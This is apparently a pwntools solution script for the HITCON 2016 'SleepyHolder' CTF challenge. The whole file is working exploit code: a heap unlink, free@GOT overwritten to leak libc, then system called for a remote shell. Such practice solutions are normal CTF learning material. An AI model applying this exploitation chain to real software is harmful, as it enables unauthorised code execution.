from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('sleepyHolder_hitcon_2016')
io = remote('node4.buuoj.cn', 25544)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
libc = ELF('libc-2.23.so')
elf = ELF('sleepyHolder_hitcon_2016')
small_ptr = 0x6020D0
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

def add(type, secret):
    io.sendlineafter('3. Renew secret\n', '1')
    io.sendlineafter('2. Big secret\n', str(type))
    io.sendafter('Tell me your secret: \n', secret)


def delete(type):
    io.sendlineafter('3. Renew secret\n', '2')
    io.sendlineafter('2. Big secret\n', str(type))


def edit(type, secret):
    io.sendlineafter('3. Renew secret\n', '3')
    io.sendlineafter('2. Big secret\n', str(type))
    io.sendafter('Tell me your secret: \n', secret)


def unlink():
    fd, bk = small_ptr - 0x18, small_ptr - 0x10
    payload = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20)
    add(1, 'small')
    add(2, 'big')
    delete(1)
    add(3, 'huge')
    delete(1)
    add(1, payload)
    delete(2)


def pwn():
    payload = cyclic(8) + p64(free_got) + p64(0) + p64(small_ptr - 0x10) + p32(1) * 2
    edit(1, payload)
    edit(2, p64(puts_plt))
    payload = p64(atoi_got) + p64(0) + p64(atoi_got) + p32(1) * 3
    edit(1, payload)
    delete(1)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    edit(2, p64(system))
    # gdb.attach(io)
    # pause()
    io.sendlineafter('3. Renew secret\n', 'sh\x00')
    io.interactive()


if __name__ == '__main__':
    unlink()
    pwn()
